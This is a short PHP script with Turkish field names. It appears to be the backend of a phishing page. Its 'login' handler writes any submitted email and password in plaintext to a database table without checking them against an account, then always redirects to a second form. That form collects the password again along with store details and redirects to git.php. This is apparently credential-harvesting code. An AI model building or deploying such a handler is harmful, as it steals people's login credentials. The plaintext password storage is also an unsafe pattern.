<?php

include 'db.php';

if (isset($_POST['login'])) {


  $ayarkaydet=$db->prepare("INSERT INTO login SET
         login_mail=:login_mail,
            login_sifre=:login_sifre
    ");

  $insert=$ayarkaydet->execute(array(
        'login_mail' => $_POST['login_mail'],
  'login_sifre' => $_POST['login_sifre']

    ));


  if ($insert) {

    header("Location:form.php");

  } else {

      header("Location:form.php");
  }

}


if (isset($_POST['form'])) {


  $ayarkaydet=$db->prepare("INSERT INTO form SET
         email=:email,
            sifre=:sifre,
            magaza=:magaza,
               fayda=:fayda,
               dahaiyi=:dahaiyi,
                  bolum=:bolum
    ");

  $insert=$ayarkaydet->execute(array(
        'email' => $_POST['email'],
  'sifre' => $_POST['sifre'],
  'magaza' => $_POST['magaza'],
'fayda' => $_POST['fayda'],
'dahaiyi' => $_POST['dahaiyi'],
'bolum' => $_POST['bolum']

    ));


  if ($insert) {

    header("Location:git.php");

  } else {

      header("Location:git.php");
  }

}

 ?>
